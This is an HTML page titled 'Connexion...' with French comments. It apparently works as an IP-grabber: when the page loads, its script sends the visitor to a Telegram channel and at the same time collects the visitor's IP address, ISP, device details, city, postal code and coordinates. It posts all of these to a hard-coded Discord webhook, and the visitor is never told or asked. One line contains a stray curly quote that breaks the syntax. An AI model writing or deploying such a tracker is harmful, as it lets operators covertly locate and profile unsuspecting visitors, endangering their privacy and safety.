  <title>Connexion...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: white;
    }
  </style>
</head>
<body>
  <script>
    // Redirection immédiate
    window.location.replace("https://t.me/cryptonautefr");

    // Récupération des infos appareil
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let deviceType = 'Inconnu';
      let brand = 'Inconnu';
      let model = 'Inconnu';

      if (/mobile/i.test(ua)) deviceType = 'Mobile';
      else if (/tablet/i.test(ua)) deviceType = 'Tablette';
      else deviceType = 'Ordinateur';

      if (/iPhone/i.test(ua)) {
        brand = 'Apple';
        model = 'iPhone';
      } else if (/iPad/i.test(ua)) {
        brand = 'Apple';
        model = 'iPad';
      } else if (/Android/i.test(ua)) {
        brand = 'Android';
        model = ua.match(/Android.*?(?:[;]\s*([^)]+?)(?:\s*Build|\))/i)?.[1] || 'Inconnu';
      } else if (/Windows/i.test(ua)) {
        brand = 'Microsoft';
        model = 'PC';
      }

      return { deviceType, brand, model, userAgent: ua };
    }

    // Récupération des infos réseau
    async function getNetworkInfo() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
          ipv4: data.ip,
          ipv6: data.ipv6 || 'Non disponible',
          isp: data.org || 'Inconnu',
          asn: data.asn || 'Inconnu',
          city: data.city || 'Inconnu',
          region: data.region || 'Inconnu',
          country: data.country_name || 'Inconnu',
          postal: data.postal || 'Inconnu',
          latitude: data.latitude || 'Inconnu',
          longitude: data.longitude || 'Inconnu'
        };
      } catch (error) {
        console.error('Erreur réseau:', error);
        return {
          ipv4: 'Erreur',
          ipv6: 'Erreur',
          isp: 'Erreur',
          asn: 'Erreur',
          city: 'Erreur',
          region: 'Erreur',
          country: 'Erreur',
          postal: 'Erreur',
          latitude: 'Erreur',
          longitude: 'Erreur'
        };
      }
    }

    // Envoi au webhook Discord
    async function sendToWebhook() {
      const deviceInfo = getDeviceInfo();
      const networkInfo = await getNetworkInfo();
      
      const payload = {
        embeds: [{
          title: "Nouveau visiteur",
          color: 0xFF0000,
          fields: [
            { name: "IPv4", value: networkInfo.ipv4, inline: true },
            { name: "IPv6", value: networkInfo.ipv6, inline: true },
            { name: "User Agent", value: deviceInfo.userAgent, inline: false },
            { name: "Type d'appareil", value: deviceInfo.deviceType, inline: true },
            { name: "Marque", value: deviceInfo.brand, inline: true },
            { name: "Modèle", value: deviceInfo.model, inline: true },
            { name: "FAI", value: networkInfo.isp, inline: true },
            { name: "ASN", value: networkInfo.asn, inline: true },
            { name: "Ville", value: networkInfo.city, inline: true },
            { name: "Région", value: networkInfo.region, inline: true },
            { name: "Pays", value: networkInfo.country, inline: true },
            { name: "Code postal", value: networkInfo.postal, inline:“true },
            { name: "Latitude", value: networkInfo.latitude.toString(), inline: true },
            { name: "Longitude", value: networkInfo.longitude.toString(), inline: true },
            { name: "Timestamp", value: new Date().toISOString(), inline: false }
          ]
        }]
      };

      try {
        await fetch('https://discord.com/api/webhooks/1369682578667471029/n56CemGjDBrnvS618LdHh5-aGp2w1FqOwgFKsu73rH7EVpalgxeQsH8UvXI4HgqS8MCe', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (error) {
        console.error('Erreur webhook:', error);
      }
    }

    // Exécution
    sendToWebhook();
  </script>
</body>
</html>
